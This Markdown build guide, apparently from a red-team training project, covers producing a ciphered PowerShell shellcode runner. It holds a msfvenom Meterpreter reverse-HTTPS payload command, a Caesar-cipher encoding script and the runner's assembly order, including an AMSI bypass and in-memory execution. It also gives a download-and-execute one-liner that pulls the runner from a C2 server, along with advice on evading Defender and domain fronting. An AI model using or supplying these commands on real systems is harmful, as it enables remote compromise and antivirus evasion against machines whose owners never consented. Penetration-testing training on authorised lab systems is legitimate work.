# Generating `run.txt`

`run.txt` is the ciphered reflective PowerShell shellcode runner both vectors
download. It is the only artifact that contains shellcode; both the DOC and
PDF vectors reference it rather than carrying it.

> **End-to-end build:** see [`../BUILD.md`](../BUILD.md) Step 2 for the full
> walkthrough.

## 1. Generate raw shellcode

```
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 LPORT=443 \
    EXITFUNC=thread -f ps1 -o raw.txt
```

`EXITFUNC=thread` is important — if the shellcode exits the process instead
of the thread, the parent PowerShell (or the reflective runner's host) will
terminate when the shell closes.

## 2. Cipher the shellcode (Caesar +5)

```
python3 - <<'PY'
import re
data = open('raw.txt').read()
nums = re.findall(r'0x([0-9a-fA-F]{2})', data)
enc  = [ (int(n,16) + 5) & 0xFF for n in nums ]
print('[Byte[]] $buf = ' + ','.join(f'0x{b:02x}' for b in enc))
PY
```

Save the output. This replaces the `[Byte[]] $buf = ...` line in the runner.

## 3. Wrap in the reflective runner (Mod 8.2.3)

Combine, in this order:

1. **AMSI bypass prefix** — the same context-corruption snippet used in
   `activate_poller.ps1`. Must come first so the reflective runner runs
   unmolested.
2. **`LookupFunc` function** — resolves Win32 API addresses via
   `Microsoft.Win32.UnsafeNativeMethods` reflection.
3. **`getDelegateType` function** — builds a delegate type from an argument
   signature at runtime.
4. **Ciphered `$buf`** from step 2.
5. **Decryption loop** — `for ($i=0; $i -lt $buf.Length; $i++) { $buf[$i] = ($buf[$i] - 5) -band 0xFF }`
6. **`VirtualAlloc` + `Marshal.Copy` + `CreateThread` + `WaitForSingleObject`**
   — the shellcode runner itself.

Save the final combined script as `run.txt`. Place it in the C2 web root.

## 4. Verify

From a Windows lab box with Defender enabled:

```
powershell -exec bypass -nop -c "iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
```

If Defender does not flag it and the handler catches a session, the runner is
clean. If Defender fires, iterate: change the Caesar key, split strings
differently, or swap the non-emulated API probe.

## Notes

- The cipher key (`5` above) is arbitrary. Change it per engagement.
- The non-emulated API trick from Mod 11.6.2 can be layered into the C#
  launcher (`payload.cs`) if the on-disk exe is flagged. The PowerShell
  runner does not need it.
- `run.txt` is served over plain HTTP in the templates. For engagements
  where HTTPS inspection is a concern, host it behind a domain-frontable
  CDN (Mod 14.6).
